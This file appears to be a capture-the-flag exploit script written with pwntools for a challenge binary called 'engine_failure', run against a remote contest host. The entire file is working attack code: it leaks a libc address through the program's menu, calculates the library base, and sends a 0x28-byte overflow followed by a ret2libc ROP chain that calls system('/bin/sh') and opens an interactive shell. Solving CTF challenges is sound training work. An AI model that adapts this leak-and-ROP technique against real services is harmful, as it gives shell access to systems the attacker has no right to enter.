from pwn import *
#io = process("./engine_failure.bin")
io = remote("spaceheroes-engine-failure.chals.io",443,ssl=True,sni="spaceheroes-engine-failure.chals.io")
libc = ELF("./libc.so.6")

io.sendlineafter("Choose an option:","2")
io.recvuntil("Coordinates: ")
libc.address = int(io.recvline()[:-1],16) - libc.symbols["puts"]

# gadget in libc
# 0x000000000002a3e5 : pop rdi ; ret
popRdi = libc.address + 0x2a3e5
ret = 0x401016

io.sendlineafter("Choose an option:","1")
io.sendlineafter("Choose an option:","1")

ret2libc = b"A"*0x28 + p64(ret) + p64(popRdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])
io.sendlineafter("write a msg you want to send >>>",ret2libc)
io.interactive()
